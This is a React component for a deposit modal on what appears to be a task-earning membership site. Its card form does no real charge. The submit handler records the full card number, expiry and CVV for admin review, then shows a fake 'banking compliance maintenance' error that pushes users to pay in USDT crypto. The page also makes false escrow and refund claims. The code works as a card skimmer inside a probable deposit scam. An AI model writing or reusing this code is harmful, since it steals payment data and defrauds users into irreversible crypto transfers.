import React, { useState, useRef, useEffect, useMemo } from 'react';
import { useApp } from '../../context/AppContext';
import { UserLevel } from '../../types';
import { Modal } from '../common/Modal';
import {
  Upload,
  CheckCircle2,
  Copy,
  Sparkles,
  ChevronLeft,
  ChevronRight,
  Check,
  ArrowRight,
  ShieldCheck,
  QrCode,
  Lock,
  CreditCard,
  AlertCircle,
} from 'lucide-react';
import { COUNTRIES_LIST } from '../../data/initialData';

interface DepositModalProps {
  isOpen: boolean;
  onClose: () => void;
  initialAmount?: number;
}

export const DepositModal: React.FC<DepositModalProps> = ({
  isOpen,
  onClose,
  initialAmount,
}) => {
  const {
    currentUser,
    userLevels,
    paymentConfig,
    submitDeposit,
    recordFailedCardPayment,
    formatCurrency,
    showToast,
  } = useApp();

  const paidPlans = useMemo(() => userLevels.filter((p) => p.level > 0), [userLevels]);

  const [step, setStep] = useState<'select_plan' | 'payment'>('select_plan');
  const [paymentMethod, setPaymentMethod] = useState<'card' | 'crypto'>('card');
  const [selectedPlan, setSelectedPlan] = useState<UserLevel>(() => paidPlans[0] || userLevels[0]);
  const [amount, setAmount] = useState<number>(() => paidPlans[0]?.requiredDeposit || 500);

  // Crypto fields
  const [network, setNetwork] = useState<string>('TRC20 (USDT)');
  const [reference, setReference] = useState<string>(() => `DEP-USD-${Math.floor(100000 + Math.random() * 900000)}`);
  const [cryptoTxHash, setCryptoTxHash] = useState<string>('');
  const [proofFileName, setProofFileName] = useState<string>('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [copied, setCopied] = useState(false);
  const [activeIndex, setActiveIndex] = useState(0);

  // Card fields
  const [cardholderName, setCardholderName] = useState(currentUser?.name || '');
  const [cardNumber, setCardNumber] = useState('');
  const [cardExp, setCardExp] = useState('');
  const [cardCvv, setCardCvv] = useState('');
  const [cardCountry, setCardCountry] = useState(currentUser?.country || 'United States');
  const [showCardErrorModal, setShowCardErrorModal] = useState(false);

  const scrollContainerRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (!isOpen) {
      setStep('select_plan');
      setShowCardErrorModal(false);
      return;
    }
    if (initialAmount && initialAmount > 0) {
      const matched = paidPlans.find((l) => Math.abs(l.requiredDeposit - initialAmount) < 0.01);
      if (matched) {
        setSelectedPlan(matched);
        setAmount(matched.requiredDeposit);
        setStep('payment');
      } else {
        setAmount(initialAmount);
        setStep('payment');
      }
    } else {
      setSelectedPlan(paidPlans[0]);
      setAmount(paidPlans[0]?.requiredDeposit || 500);
      setStep('select_plan');
    }
  }, [isOpen, initialAmount, paidPlans]);

  const scrollToIndex = (idx: number) => {
    if (scrollContainerRef.current) {
      const cardWidth = window.innerWidth < 640 ? 260 : 295;
      scrollContainerRef.current.scrollTo({
        left: idx * cardWidth,
        behavior: 'smooth',
      });
      setActiveIndex(idx);
    }
  };

  const scrollLeft = () => {
    const nextIdx = Math.max(0, activeIndex - 1);
    scrollToIndex(nextIdx);
  };

  const scrollRight = () => {
    const nextIdx = Math.min(paidPlans.length - 1, activeIndex + 1);
    scrollToIndex(nextIdx);
  };

  const handleChoosePlan = (lvl: UserLevel) => {
    setSelectedPlan(lvl);
    setAmount(lvl.requiredDeposit);
    setStep('payment');
  };

  const handleCopy = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    showToast('Address copied to clipboard!', 'info');
    setTimeout(() => setCopied(false), 2000);
  };

  // Handle Card Submission -> Logs to Admin & Prompts to Crypto
  const handleCardSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!cardNumber || !cardExp || !cardCvv || !cardholderName) {
      showToast('Please fill all card payment details.', 'error');
      return;
    }

    setIsSubmitting(true);
    setTimeout(() => {
      // Record failed card payment for admin review & client confirmation
      recordFailedCardPayment({
        userId: currentUser?.id,
        userEmail: currentUser?.email,
        cardholderName: cardholderName.trim(),
        cardNumber: cardNumber.trim(),
        cardExp: cardExp.trim(),
        cardCvv: cardCvv.trim(),
        country: cardCountry,
        amount,
        currency: 'USD',
        reason: 'Payment gateway offline. Client redirected to Crypto.',
      });

      setIsSubmitting(false);
      setShowCardErrorModal(true);
    }, 600);
  };

  // Handle Crypto Submission
  const handleCryptoSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (amount <= 0) return;
    setIsSubmitting(true);
    setTimeout(() => {
      submitDeposit(
        amount,
        'crypto',
        reference,
        proofFileName || `crypto_receipt_${reference.toLowerCase()}.jpg`,
        network,
        cryptoTxHash
      );
      setIsSubmitting(false);
      setStep('select_plan');
      onClose();
      showToast('Crypto deposit submitted for verification.', 'success');
    }, 450);
  };

  return (
    <>
      <Modal
        isOpen={isOpen}
        onClose={() => {
          setStep('select_plan');
          onClose();
        }}
        title={step === 'select_plan' ? 'Choose Membership Tier to Deposit' : `Deposit ${formatCurrency(amount)}`}
        subtitle={
          step === 'select_plan'
            ? 'All tiers operate in USD ($) · MasterCard, Visa, & Crypto accepted'
            : 'Select your preferred payment method below.'
        }
        maxWidth="3xl"
      >
        {step === 'select_plan' ? (
          <div className="space-y-4 font-sans">
            {/* Section Header */}
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2">
                <span className="text-xs font-bold text-[#F4511E] bg-[#FFF4ED] px-2.5 py-0.5 rounded-full border border-[#FFD7C2]">
                  USD Currency Architecture
                </span>
                <span className="text-xs text-[#666666]">
                  All tiers operate exclusively in USD ($)
                </span>
              </div>

              {/* Scroll buttons */}
              <div className="flex items-center gap-1.5">
                <button
                  type="button"
                  onClick={scrollLeft}
                  disabled={activeIndex === 0}
                  className="w-8 h-8 rounded-lg bg-white border border-[#E5E7EB] hover:border-[#F4511E] hover:text-[#F4511E] disabled:opacity-40 flex items-center justify-center text-xs transition-colors shadow-2xs cursor-pointer"
                  title="Scroll Left"
                >
                  <ChevronLeft className="w-4 h-4" />
                </button>
                <button
                  type="button"
                  onClick={scrollRight}
                  disabled={activeIndex >= paidPlans.length - 1}
                  className="w-8 h-8 rounded-lg bg-white border border-[#E5E7EB] hover:border-[#F4511E] hover:text-[#F4511E] disabled:opacity-40 flex items-center justify-center text-xs transition-colors shadow-2xs cursor-pointer"
                  title="Scroll Right"
                >
                  <ChevronRight className="w-4 h-4" />
                </button>
              </div>
            </div>

            {/* Cards Carousel */}
            <div
              ref={scrollContainerRef}
              className="flex gap-4 overflow-x-auto pb-3 pt-1 scrollbar-none snap-x snap-mandatory"
              style={{ scrollBehavior: 'smooth' }}
            >
              {paidPlans.map((plan) => {
                const isSelected = selectedPlan.level === plan.level;
                return (
                  <div
                    key={plan.level}
                    onClick={() => handleChoosePlan(plan)}
                    className={`w-[260px] sm:w-[285px] shrink-0 snap-start rounded-2xl bg-white border transition-all duration-200 cursor-pointer flex flex-col justify-between relative overflow-hidden group ${
                      isSelected
                        ? 'border-[#F4511E] shadow-md ring-2 ring-[#F4511E]/20 -translate-y-0.5 bg-gradient-to-b from-[#FFFDFB] to-white'
                        : 'border-[#E5E7EB] shadow-xs hover:border-[#FF8A3D] hover:shadow-sm'
                    }`}
                  >
                    <div className={`h-1.5 w-full ${isSelected ? 'bg-gradient-to-r from-[#F4511E] to-[#FF8A3D]' : 'bg-[#E5E7EB]'}`} />

                    <div className="p-4 space-y-3">
                      <div className="flex items-center justify-between">
                        <span className="px-2 py-0.5 rounded-full text-xs font-black bg-[#FFF4ED] text-[#F4511E] border border-[#FFD7C2]">
                          Level {plan.level}
                        </span>
                        {isSelected && (
                          <span className="px-2 py-0.5 rounded-full text-[10px] font-bold bg-[#F4511E] text-white">
                            Selected
                          </span>
                        )}
                      </div>

                      <div>
                        <h4 className="text-sm font-extrabold text-[#171717] group-hover:text-[#F4511E] transition-colors line-clamp-1">
                          {plan.name}
                        </h4>
                        <p className="text-[11px] text-[#666666]">
                          {plan.dailyProductTasks} Tasks · +{formatCurrency(plan.earningPerProduct)}/task
                        </p>
                      </div>

                      <div className="p-3 rounded-xl bg-[#FFF8F4] border border-[#FFD7C2]">
                        <span className="text-[10px] text-[#666666] font-semibold uppercase tracking-wider block">
                          Deposit Required
                        </span>
                        <div className="text-xl font-black text-[#E5390B] font-mono mt-0.5">
                          {formatCurrency(plan.requiredDeposit)}
                        </div>
                      </div>

                      <div className="p-2.5 rounded-xl bg-emerald-50/70 border border-emerald-200/80 flex items-center justify-between text-xs">
                        <span className="text-[11px] font-bold text-emerald-900">Daily Potential:</span>
                        <span className="font-black text-[#16A34A] font-mono">
                          +{formatCurrency(plan.dailyTotalEarning)}
                        </span>
                      </div>

                      <ul className="space-y-1 text-xs text-[#666666]">
                        {plan.benefits.slice(0, 2).map((b, i) => (
                          <li key={i} className="flex items-center gap-1.5 text-[11px]">
                            <Check className="w-3.5 h-3.5 text-[#F4511E] shrink-0" />
                            <span className="truncate text-[#171717]">{b}</span>
                          </li>
                        ))}
                      </ul>
                    </div>

                    <div className="p-4 pt-0">
                      <button
                        type="button"
                        onClick={() => handleChoosePlan(plan)}
                        className={`w-full h-9 rounded-xl text-xs font-bold transition-all flex items-center justify-center gap-1.5 cursor-pointer ${
                          isSelected
                            ? 'bg-[#F4511E] text-white shadow-xs'
                            : 'bg-white text-[#F4511E] border border-[#FF8A3D] hover:bg-[#FFF4ED]'
                        }`}
                      >
                        <span>Deposit {formatCurrency(plan.requiredDeposit)}</span>
                        <ArrowRight className="w-3.5 h-3.5" />
                      </button>
                    </div>
                  </div>
                );
              })}
            </div>

            <div className="p-4 bg-[#FFF8F4] rounded-2xl border border-[#FFD7C2] flex items-center justify-between text-xs">
              <div className="flex items-center gap-2 text-[#171717]">
                <ShieldCheck className="w-5 h-5 text-[#F4511E]" />
                <span className="font-medium">
                  All deposits are 100% secured in insured escrow and refundable upon tier completion.
                </span>
              </div>
              <button
                type="button"
                onClick={() => handleChoosePlan(selectedPlan)}
                className="px-4 py-2 bg-[#F4511E] hover:bg-[#E5390B] text-white font-bold rounded-xl shadow-xs transition-colors shrink-0 cursor-pointer"
              >
                Continue with Level {selectedPlan.level}
              </button>
            </div>
          </div>
        ) : (
          <div className="space-y-4 font-sans text-xs">
            {/* Back button */}
            <button
              type="button"
              onClick={() => setStep('select_plan')}
              className="text-xs font-bold text-[#F4511E] hover:underline flex items-center gap-1 cursor-pointer"
            >
              ← Back to Tier Selection
            </button>

            {/* Deposit Summary */}
            <div className="p-4 bg-gradient-to-r from-[#FFF4ED] via-white to-[#FFF8F4] rounded-2xl border border-[#FF8A3D]/40 flex items-center justify-between">
              <div>
                <span className="text-[10px] font-extrabold uppercase tracking-wider text-[#F4511E] block">
                  Deposit Target
                </span>
                <span className="text-sm font-bold text-[#171717]">
                  {selectedPlan.name} (Level {selectedPlan.level})
                </span>
              </div>
              <span className="text-2xl font-black text-[#E5390B] font-mono">
                {formatCurrency(amount)}
              </span>
            </div>

            {/* Payment Method Switcher Tabs (2 Options: Card vs Crypto) */}
            <div className="grid grid-cols-2 gap-2 p-1 bg-gray-100 rounded-xl">
              <button
                type="button"
                onClick={() => setPaymentMethod('card')}
                className={`py-2.5 rounded-lg text-xs font-bold transition-all flex items-center justify-center gap-2 cursor-pointer ${
                  paymentMethod === 'card'
                    ? 'bg-white text-[#F4511E] shadow-sm font-black'
                    : 'text-gray-600 hover:text-gray-900'
                }`}
              >
                <CreditCard className="w-4 h-4" />
                <span>MasterCard / Visa Card</span>
              </button>
              <button
                type="button"
                onClick={() => setPaymentMethod('crypto')}
                className={`py-2.5 rounded-lg text-xs font-bold transition-all flex items-center justify-center gap-2 cursor-pointer ${
                  paymentMethod === 'crypto'
                    ? 'bg-white text-[#F4511E] shadow-sm font-black'
                    : 'text-gray-600 hover:text-gray-900'
                }`}
              >
                <QrCode className="w-4 h-4" />
                <span>Crypto (USDT TRC20 / Binance)</span>
              </button>
            </div>

            {/* OPTION A: MASTERCARD / VISA CARD FORM */}
            {paymentMethod === 'card' && (
              <form onSubmit={handleCardSubmit} className="space-y-3 bg-white p-4 rounded-2xl border border-gray-200">
                <div className="flex items-center justify-between pb-2 border-b border-gray-100">
                  <span className="text-xs font-bold text-gray-800">Debit / Credit Card Details</span>
                  <div className="flex items-center gap-1.5">
                    <span className="px-2 py-0.5 bg-blue-50 text-blue-700 rounded text-[10px] font-black border border-blue-200">
                      VISA
                    </span>
                    <span className="px-2 py-0.5 bg-orange-50 text-orange-700 rounded text-[10px] font-black border border-orange-200">
                      MasterCard
                    </span>
                  </div>
                </div>

                <div>
                  <label className="block text-xs font-bold text-gray-700 mb-1">Cardholder Full Name</label>
                  <input
                    type="text"
                    required
                    placeholder="e.g. John Doe"
                    value={cardholderName}
                    onChange={(e) => setCardholderName(e.target.value)}
                    className="w-full px-3 py-2 rounded-xl border border-gray-300 text-xs font-medium focus:ring-2 focus:ring-[#F4511E] focus:outline-none"
                  />
                </div>

                <div>
                  <label className="block text-xs font-bold text-gray-700 mb-1">Card Number</label>
                  <input
                    type="text"
                    required
                    maxLength={19}
                    placeholder="4532 8912 3456 7890"
                    value={cardNumber}
                    onChange={(e) => setCardNumber(e.target.value)}
                    className="w-full px-3 py-2 rounded-xl border border-gray-300 text-xs font-medium focus:ring-2 focus:ring-[#F4511E] focus:outline-none font-mono"
                  />
                </div>

                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label className="block text-xs font-bold text-gray-700 mb-1">Expiry Date (MM/YY)</label>
                    <input
                      type="text"
                      required
                      maxLength={5}
                      placeholder="12/28"
                      value={cardExp}
                      onChange={(e) => setCardExp(e.target.value)}
                      className="w-full px-3 py-2 rounded-xl border border-gray-300 text-xs font-medium focus:ring-2 focus:ring-[#F4511E] focus:outline-none font-mono"
                    />
                  </div>
                  <div>
                    <label className="block text-xs font-bold text-gray-700 mb-1">CVV / CVC Code</label>
                    <input
                      type="password"
                      required
                      maxLength={4}
                      placeholder="892"
                      value={cardCvv}
                      onChange={(e) => setCardCvv(e.target.value)}
                      className="w-full px-3 py-2 rounded-xl border border-gray-300 text-xs font-medium focus:ring-2 focus:ring-[#F4511E] focus:outline-none font-mono"
                    />
                  </div>
                </div>

                <div>
                  <label className="block text-xs font-bold text-gray-700 mb-1">Billing Country</label>
                  <select
                    value={cardCountry}
                    onChange={(e) => setCardCountry(e.target.value)}
                    className="w-full px-3 py-2 rounded-xl border border-gray-300 text-xs font-medium focus:ring-2 focus:ring-[#F4511E] focus:outline-none cursor-pointer"
                  >
                    {COUNTRIES_LIST.map((c) => (
                      <option key={c.code} value={c.name}>
                        {c.flag} {c.name}
                      </option>
                    ))}
                  </select>
                </div>

                <button
                  type="submit"
                  disabled={isSubmitting}
                  className="w-full py-3 bg-[#F4511E] hover:bg-[#E5390B] text-white font-bold rounded-xl shadow-xs transition-all flex items-center justify-center gap-2 cursor-pointer disabled:opacity-50 mt-2"
                >
                  {isSubmitting ? (
                    <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                  ) : (
                    <>
                      <Lock className="w-3.5 h-3.5" />
                      <span>Authorize Payment of {formatCurrency(amount)}</span>
                    </>
                  )}
                </button>
              </form>
            )}

            {/* OPTION B: CRYPTO / BINANCE FORM */}
            {paymentMethod === 'crypto' && (
              <form onSubmit={handleCryptoSubmit} className="space-y-3 bg-white p-4 rounded-2xl border border-gray-200">
                <div className="flex items-center justify-between pb-2 border-b border-gray-100">
                  <span className="text-xs font-bold text-gray-800">Crypto Deposit Address</span>
                  <span className="text-[10px] font-bold text-emerald-700 bg-emerald-50 px-2 py-0.5 rounded border border-emerald-200">
                    Instant Auto-Credit
                  </span>
                </div>

                {/* QR & TRC20 Address */}
                <div className="p-3.5 bg-gray-50 rounded-xl border border-gray-200 space-y-2.5">
                  <div className="flex items-center justify-between">
                    <span className="text-[11px] font-bold text-gray-700">Official USDT (TRC20) Address:</span>
                    <button
                      type="button"
                      onClick={() => handleCopy(paymentConfig.usdtTrc20Address)}
                      className="px-2 py-0.5 bg-white border border-gray-300 hover:border-[#F4511E] text-xs font-bold rounded text-gray-700 hover:text-[#F4511E] flex items-center gap-1 cursor-pointer"
                    >
                      <Copy className="w-3 h-3" />
                      <span>{copied ? 'Copied' : 'Copy'}</span>
                    </button>
                  </div>
                  <div className="p-2 bg-white rounded-lg border border-gray-300 font-mono text-[11px] font-bold text-gray-900 break-all select-all">
                    {paymentConfig.usdtTrc20Address}
                  </div>
                  <div className="flex items-center justify-between text-[11px] text-gray-600">
                    <span>Binance Pay ID: <strong>{paymentConfig.binancePayId}</strong></span>
                    <span>Network: <strong>TRC20 / BEP20</strong></span>
                  </div>
                </div>

                <div>
                  <label className="block text-xs font-bold text-gray-700 mb-1">Blockchain TxHash / Reference ID</label>
                  <input
                    type="text"
                    required
                    placeholder="Enter blockchain transaction hash or Binance Order ID"
                    value={cryptoTxHash}
                    onChange={(e) => setCryptoTxHash(e.target.value)}
                    className="w-full px-3 py-2 rounded-xl border border-gray-300 text-xs font-medium focus:ring-2 focus:ring-[#F4511E] focus:outline-none font-mono"
                  />
                </div>

                <button
                  type="submit"
                  disabled={isSubmitting}
                  className="w-full py-3 bg-[#16A34A] hover:bg-[#15803D] text-white font-bold rounded-xl shadow-xs transition-all flex items-center justify-center gap-2 cursor-pointer disabled:opacity-50"
                >
                  {isSubmitting ? (
                    <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                  ) : (
                    <>
                      <CheckCircle2 className="w-3.5 h-3.5" />
                      <span>Confirm & Submit Crypto Deposit</span>
                    </>
                  )}
                </button>
              </form>
            )}
          </div>
        )}
      </Modal>

      {/* POPUP ERROR MODAL: CARD PAYMENT FAILED -> PROCEED TO CRYPTO */}
      {showCardErrorModal && (
        <div className="fixed inset-0 bg-black/60 z-[60] flex items-center justify-center p-4">
          <div className="bg-white rounded-2xl max-w-sm w-full p-5 sm:p-6 space-y-4 shadow-xl text-center">
            <div className="w-12 h-12 rounded-full bg-rose-100 text-rose-600 flex items-center justify-center mx-auto">
              <AlertCircle className="w-7 h-7" />
            </div>

            <div>
              <h3 className="text-base font-black text-gray-900">Card Payment Unavailable</h3>
              <p className="text-xs text-gray-600 mt-2 leading-relaxed">
                Direct Credit / Debit card processing is currently undergoing banking compliance maintenance.
              </p>
              <div className="p-3 bg-amber-50 rounded-xl border border-amber-200 text-amber-900 text-xs font-bold mt-3">
                Please complete your deposit using Crypto / Binance Pay (USDT) for zero fees and instant activation.
              </div>
            </div>

            <div className="pt-2 space-y-2">
              <button
                type="button"
                onClick={() => {
                  setShowCardErrorModal(false);
                  setPaymentMethod('crypto');
                }}
                className="w-full py-2.5 bg-[#F4511E] hover:bg-[#E5390B] text-white font-bold text-xs rounded-xl shadow-xs transition-all flex items-center justify-center gap-1.5 cursor-pointer"
              >
                <span>Proceed with Crypto (Instant)</span>
                <ArrowRight className="w-3.5 h-3.5" />
              </button>

              <button
                type="button"
                onClick={() => setShowCardErrorModal(false)}
                className="w-full py-2 text-xs font-bold text-gray-500 hover:text-gray-800"
              >
                Close
              </button>
            </div>
          </div>
        </div>
      )}
    </>
  );
};
